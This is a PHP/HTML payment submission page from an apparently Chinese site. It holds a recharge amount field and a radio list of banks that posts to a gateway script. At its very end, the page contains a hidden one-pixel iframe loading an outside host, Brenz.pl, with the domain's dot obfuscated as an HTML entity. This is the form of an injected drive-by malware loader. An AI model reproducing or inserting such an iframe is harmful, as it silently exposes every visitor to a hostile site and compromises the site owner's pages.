<?php
include_once("../config.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>支付提交页</title>
<link rel="stylesheet" href="../images/app_style.css"  type="text/css" />
<script language=javascript src="../images/app_common.js"></script>
</head>
<body>
<div id="wrap">
<table width="100%" height="34" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-top:20px">
  <tr>
    <td width="33%"><img src="../images/logo-pay.jpg" /></td>
	<td width="68%" valign="bottom"><span class="logotxt">快速充值</span></td>
  </tr>
</table>
      <table width="600" border="0" align="center" cellpadding="0" cellspacing="1" class="mytable">
	  <form name="f1" action="getway.php" method="post" onsubmit="return checkfrom(this)" target="_blank">
	  <tr>
	  <input name="channelId" value="1" type="hidden" />
	  <tr>
        <td height="25" align="right">金额：</td>
        <td><input name="faceValue" type="text" id="faceValue" class="app_input" />
        *</td>
      </tr>
	  <tr>
	    <td height="25" align="right">选择银行：</td>
	    <td><div class="banklist"><ul>
		 <li><input id="ICBC-NET" type="radio" checked="checked"  name="pd_FrpId" value="10001" /><label for="ICBC-NET"><img align="absmiddle" src="../images/bank-pay/gongshang.gif" width="154" height="33" alt="中国工商银行" border="0" /><b title="中国工商银行"></b></label></li>
    <li><input id="ABC-NET" type="radio" name="pd_FrpId" value="10002" /><label for="ABC-NET"><img align="absmiddle" src="../images/bank-pay/nongye.gif" width="154" height="33" alt="中国农业银行" border="0" /><b title="中国农业银行"></b></label></li>
  <li><input id="CCB-NET" type="radio" name="pd_FrpId" value="10005" /><label for="CCB-NET"><img align="absmiddle" src="../images/bank-pay/jianshe.gif" width="154" height="33" alt="建设银行" border="0" /><b title="建设银行"></b></label></li>
  <li><input id="BOC-NET" type="radio" name="pd_FrpId" value="10004" /><label for="BOC-NET"><img align="absmiddle" src="../images/bank-pay/zhongguo.gif" width="154" height="33" alt="中国银行" border="0" /><b title="中国银行"></b></label></li>
  <li><input id="CMBCHINA-NET" type="radio" name="pd_FrpId" value="10003" /><label for="CMBCHINA-NET"><img align="absmiddle" src="../images/bank-pay/zhaohang.gif" width="154" height="33" alt="中国招商银行" border="0" /><b title="招商银行"></b></label></li>
  <li><input id="CMBC-NET" type="radio" name="pd_FrpId" value="10006" /><label for="CMBC-NET"><img align="absmiddle" src="../images/bank-pay/minsheng.gif" width="154" height="33" alt="中国民生银行民生卡" border="0" /><b title="民生银行"></b></label></li>
    <li><input id="BOCO-NET" type="radio" name="pd_FrpId" value="10008" /><label for="BOCO-NET"><img align="absmiddle" src="../images/bank-pay/jiaotong.gif" width="154" height="33" alt="交通银行" border="0" /><b title="交通银行"></b></label></li>
    <li><input id="CEB-NET" type="radio" name="pd_FrpId" value="10010" /><label for="CEB-NET"><img align="absmiddle" src="../images/bank-pay/guangda.gif" width="154" height="33" alt="光大银行" border="0" /><b title="光大银行"></b></label></li>
  <li><input id="SDB-NET" type="radio" name="pd_FrpId" value="10011" /><label for="SDB-NET"><img align="absmiddle" src="../images/bank-pay/shenfa.gif" width="154" height="33" alt="深圳发展银行" border="0" /><b title="深圳发展银行"></b></label></li>
	<li><input id="POST-NET" type="radio" name="pd_FrpId" value="10012" /><label for="POST-NET"><img align="absmiddle" src="../images/bank-pay/youzheng.gif" width="154" height="33" alt="中国邮政" border="0" /><b title="中国邮政"></b></label></li>
  <li><input id="HX-NET" type="radio" name="pd_FrpId" value="10023" /><label for="HX-NET"><img align="absmiddle" src="../images/bank-pay/huaxia.gif" width="154" height="33" alt="华夏银行" border="0" /><b title="华夏银行"></b></label></li>
  <li><input id="SPDB-NET" type="radio" name="pd_FrpId" value="10015" /><label for="SPDB-NET"><img align="absmiddle" src="../images/bank-pay/shangpufa.gif" width="154" height="33" alt="上海浦东发展银行" border="0" /><b title="上海浦东发展银行"></b></label></li>
    <li><input id="GDB-NET" type="radio" name="pd_FrpId" value="10016" /><label for="GDB-NET"><img align="absmiddle" src="../images/bank-pay/guangfa.gif" width="154" height="33" alt="广东发展银行" border="0" /><b title="广东发展银行"></b></label></li>
	</ul></div>
	  </td>
	  </tr>
      <tr>
        <td height="25" colspan="2" align="center"><input name="Submit" type="submit" class="btn2 " value="提交" /></td>
      </tr>
	  </form>
    </table>
    <br />
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>